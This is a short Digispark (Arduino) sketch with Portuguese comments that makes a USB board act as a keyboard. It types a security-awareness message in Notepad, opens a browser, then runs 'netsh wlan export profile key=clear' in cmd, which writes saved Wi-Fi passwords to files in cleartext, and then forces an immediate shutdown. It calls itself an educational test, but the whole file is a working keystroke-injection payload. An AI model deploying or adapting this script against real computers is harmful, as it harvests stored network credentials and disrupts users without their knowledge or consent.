#include "DigiKeyboard.h"

void setup() {
  // Aguarda inicialização do dispositivo
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1500);

  // Abre o menu Executar (Windows + R) para abrir o Bloco de Notas
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("notepad");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Mensagem de conscientização
  DigiKeyboard.print("<< ALERTA DE SEGURANCA >>");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Este computador executou comandos via USB.");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Dispositivos como Digispark podem simular um teclado.");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Ataques podem ser feitos sem o usuario perceber.");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Este e apenas um teste educativo. <<");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // Abre o menu Executar para abrir o navegador
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("www.google.com");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Abre o cmd para exportar perfis Wi-Fi (não mudou)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("netsh wlan export profile key=clear");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

   // Abre o menu Executar (Windows + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Digita o comando de desligamento imediato
  DigiKeyboard.print("shutdown -s -t 0");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  
}

void loop() {
  // Vazio, pois o Digispark roda setup() apenas uma vez
}
